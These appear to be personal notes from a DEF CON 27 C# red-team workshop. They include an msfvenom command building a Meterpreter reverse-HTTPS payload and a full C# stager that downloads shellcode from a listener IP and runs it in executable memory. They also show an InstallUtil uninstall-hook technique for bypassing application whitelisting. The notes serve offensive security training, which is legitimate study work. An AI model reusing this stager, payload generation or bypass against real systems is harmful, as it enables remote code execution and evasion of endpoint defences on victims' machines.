https://github.com/mvelazc0/defcon27_csharp_workshop

# Defcon Csharp workshop

set up one windows vm and one kali linux vm.
One kali linux:
`metasploit`
`pip install twistd`
`EmpireProject`

# lab 1

## Exercise 1

hellow world

## Exercise 2

inside cff exploreer in import directory we can see that mscore.lib is being imported

monitor with procmon

# lab 2

Downloada meterpreter stager

in network tab of process hacker we can look at network artifacts

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=Your_Kali_IP LPORT=8080
-f exe > ~/reverse.exe
```

creating an https listener

```
openssl genrsa > privkey.pem;
openssl req -new -x509 -key privkey.pem -out cert.pem -days 365;
twistd -n web -c cert.pem -k privkey.pem --https=8080;
```

using web.client we can download and execute as well

## Exercise 3

creating a custom stager

```C#
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program
{

    //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;


    public static void Main()
    {
        string url = "https://192.168.0.35:8080/nD7qcbYj8eZVilSICKHiKQ5d9UJt8wcsY3KVBWrtBEvK9mbfbWNqZ9sf1";
        Stager(url);
    }

    public static void Stager(string url)
    {

        WebClient wc = new WebClient();
        wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

        byte[] shellcode = wc.DownloadData(url);

        UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
        IntPtr threatHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;
        threatHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
        WaitForSingleObject(threatHandle, 0xFFFFFFFF);

    }



}
```

# Lab 3

raw shellcod einjection

## exercise 2 

bypassing application whitelisting

```C#
using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;


public class Program
{
    public static void Main()
    {
        Console.WriteLine("I am not malicious :)");
        Console.ReadKey();
    }

}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        LegitInstaller.Run();
    }

}

public class LegitInstaller
{

    public static void Run()
    {
        Process.Start("notepad.exe");
        Console.ReadKey();

    }

}

```

```
C:\Users\WIN10RED\source\repos\cryptopals_net\cryptopals_net\bin\x64\Release>C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile=false /U ./cryptopals_net.exe
Microsoft (R) .NET Framework Installation utility Version 4.8.4084.0
Copyright (C) Microsoft Corporation.  All rights reserved.

Exception occurred while initializing the installation:
System.BadImageFormatException: Could not load file or assembly 'file:///C:\Users\WIN10RED\source\repos\cryptopals_net\cryptopals_net\bin\x64\Release\cryptopals_net.exe' or one of its dependencies. An attempt was made to load a program with an incorrect format..
```

# lab 4 

shellcode obfuscation

## xor the payload

## AES encryption of payload

# lab 5 powershell without powershell.exe

## Executing PWS cmdlets

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:"C:\Program Files
(x86)\Reference
Assemblies\Microsoft\WindowsPowerShell\3.0\System.Management.Automation.dll" 1.cs
```

dll not found error : https://stackoverflow.com/questions/27374767/missing-automation-from-namespace-system-management-missing-assembly-referenc#:~:text=If%20a%20DLL%20is%20not%20found%2C%20there%20is,package%20names%20have%20changed.%20Uninstall%20the%20package%20System.Management.Automation










